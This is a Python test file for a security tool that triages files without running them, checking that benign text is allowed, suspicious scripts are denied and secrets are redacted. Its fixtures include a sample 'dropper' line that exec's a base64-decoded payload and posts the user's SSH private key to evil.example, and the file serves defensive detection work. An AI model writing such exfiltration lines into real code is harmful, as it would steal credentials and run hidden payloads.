from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
SCRIPT = REPO_ROOT / "scripts" / "security" / "artifact_triage.py"


def _load_module():
    spec = importlib.util.spec_from_file_location("_artifact_triage", SCRIPT)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def test_benign_text_artifact_allows_with_receipt(tmp_path: Path) -> None:
    triage = _load_module()
    artifact = tmp_path / "readme.txt"
    artifact.write_text("normal project notes\nno remote callbacks\n", encoding="utf-8")

    report = triage.triage_artifact(artifact)

    assert report.decision == "ALLOW"
    assert report.artifact_sha256
    assert report.file_kind == "text_like"
    assert "Do not execute the artifact during triage." in report.recommended_next_steps


def test_suspicious_script_is_quarantined_or_denied_without_execution(tmp_path: Path) -> None:
    triage = _load_module()
    artifact = tmp_path / "dropper.py"
    artifact.write_text(
        "import base64, subprocess, requests\n"
        "exec(base64.b64decode(payload))\n"
        "requests.post('https://evil.example/upload', data=open('.ssh/id_rsa').read())\n"
        "subprocess.run('powershell startup task', shell=True)\n",
        encoding="utf-8",
    )

    report = triage.triage_artifact(artifact)
    rules = {hit.rule_id for hit in report.indicators}

    assert report.decision == "DENY"
    assert "dynamic_code_execution" in rules
    assert "network_callback" in rules
    assert "credential_access_terms" in rules
    assert any("Do not execute" in step for step in report.recommended_next_steps)


def test_binary_blob_with_strings_is_quarantined(tmp_path: Path) -> None:
    triage = _load_module()
    artifact = tmp_path / "sample.exe"
    artifact.write_bytes(b"MZ\x00\x00" + b"\x01" * 64 + b"http://callback.example/ping\x00startup registry\x00")

    report = triage.triage_artifact(artifact)

    assert report.file_kind == "pe_binary"
    assert report.decision in {"QUARANTINE", "DENY"}
    assert report.extracted_string_count >= 1


def test_report_redacts_secret_like_strings(tmp_path: Path) -> None:
    triage = _load_module()
    artifact = tmp_path / "config.txt"
    artifact.write_text("token=hf_abcdefghijklmnopqrstuvwxyz\n", encoding="utf-8")

    report = triage.triage_artifact(artifact)
    payload = json.dumps(triage.report_to_dict(report))

    assert "hf_abcdefghijklmnopqrstuvwxyz" not in payload
    assert "[REDACTED]" in payload


def test_code_governance_gate_exposes_artifact_triage(tmp_path: Path) -> None:
    gate_path = REPO_ROOT / "scripts" / "security" / "code_governance_gate.py"
    spec = importlib.util.spec_from_file_location("_code_governance_gate_artifact", gate_path)
    assert spec is not None and spec.loader is not None
    gate = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = gate
    spec.loader.exec_module(gate)

    artifact = tmp_path / "sample.py"
    artifact.write_text("exec(base64.b64decode(payload))\nrequests.post('https://evil.example')\n", encoding="utf-8")

    result = gate.check_artifact(artifact)

    assert result.findings
    assert result.files_checked == 1
    assert result.findings[0].category == "ARTIFACT_TRIAGE"
    assert result.decision in {"WARN", "BLOCK"}
    assert gate.exit_code(result) in {1, 2}
